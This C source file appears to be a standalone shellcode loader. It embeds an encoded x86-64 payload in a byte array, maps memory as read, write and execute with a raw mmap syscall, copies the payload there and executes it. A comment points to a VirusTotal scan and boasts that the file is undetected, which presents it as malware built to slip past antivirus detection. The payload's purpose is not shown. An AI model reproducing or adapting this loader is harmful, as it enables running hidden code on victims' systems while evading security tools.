/* #include <sys/mman.h> */
#include <stdint.h>
#include <stddef.h>

/* https://www.virustotal.com/gui/file-analysis/MmQ4ZjdlYWY5YmM5OTc2YTI0MGZjZGNkNGI3Mzg2M2M6MTc0ODY2MzI2OA== */
/* undetected (lol) */


unsigned char buf[] =
"\x4d\x31\xc9\x48\x89\xe5\x41\xb1\x15\xda\xc9\x66\x81\xe5"
"\xe0\xf8\x48\x0f\xae\x45\x00\x49\xbe\x88\x5e\x76\x9b\x27"
"\xcd\x05\xb1\x48\x83\xc5\x08\x4c\x8b\x65\x00\x49\xff\xc9"
"\x4f\x31\x74\xcc\x2b\x4d\x85\xc9\x75\xf3\xc0\x6f\xb6\xcf"
"\xfc\x01\x4d\x0a\xa8\xcd\x8c\x20\x16\x13\xc7\xa8\xc9\x04"
"\xc6\x95\x41\x8c\x84\x53\xd8\xac\x3f\x94\x89\xcf\x4c\x32"
"\x4a\x56\x3b\x10\x2d\x85\xfa\x79\xc1\x6f\x2a\x5a\x09\x85"
"\x80\x71\xfd\xad\x02\x49\x81\xad\xf5\x22\x7b\x95\x1e\xb0"
"\x1c\x5f\x66\x1f\xbf\xfe\x05\x62\xbb\x37\xb5\x8b\xea\xb4"
"\x1f\x07\x73\x72\x10\x2e\xf8\x40\x1f\x83\xb1\x52\x3c\x26"
"\xb5\x8d\x1c\x39\x99\xa3\x1b\x22\xcf\x95\x23\xfb\x54\xe7"
"\x49\x7d\xd6\x90\x2a\x11\x74\x5f\xff\x4f\xeb\xa1\x57\x04"
"\x74\x72\x05\x4b\xe1\xac\xed\x76\x1c\x5f\x66\x67\x92\x8a"
"\x60\x10\x71\x36\x08\x7e\xd3\xd3\x60\x0f\x69\x33\x07\x6b"
"\xd0\x8c\x05\x34\x4b\x0b\x38\x75\x84\xa6\x0a\x67\x45\x36"
"\xcc\x65\x9f\x0c\x7a\xa6\x96\x85\x21\xf6";

//stolen values from glibc sources
#define PROT_READ 0x1
#define PROT_WRITE 0x2
#define PROT_EXEC 0x4
#define MAP_PRIVATE 0x2
#define MAP_ANONYMOUS 0x20


void *_mmap(void *addr, uint64_t length, int prot, int flags, int fd, uint64_t offset) {
    void *ret;
    register long r10 __asm__("r10") = flags;
    register long r8  __asm__("r8")  = fd;
    register long r9  __asm__("r9")  = offset;
    __asm__ volatile (
        "mov $9, %%rax\n"        // syscall number for mmap
        "syscall"
        : "=a"(ret)
        : "D"(addr), "S"(length), "d"(prot), "r"(r10), "r"(r8), "r"(r9)
        : "rcx", "r11", "memory"
    );
    return ret;
}

void _memcpy(void *dest, const void *src, size_t n) {
    unsigned char *d = (unsigned char *)dest;
    const unsigned char *s = (const unsigned char *)src;
    for (size_t i = 0; i < n; i++) {
        d[i] = s[i];
    }
}

void _start() {
    //we need executable memory (malloc doesnt do that)
	void *exec = _mmap(
		0,
		sizeof(buf),
		PROT_READ | PROT_WRITE | PROT_EXEC,
		MAP_ANONYMOUS | MAP_PRIVATE,
		-1, 0 //values from man mmap in MAP_ANONYMOUS section
		);

    _memcpy(exec, buf, sizeof(buf));
    ((void(*)())exec)();

	__asm__ volatile ( //return 0 (otherwise segfault)
		"xorl %edi, %edi\n"  // status = 0
        "movl $60, %eax\n"   // syscall number for exit
        "syscall\n"
    );
}
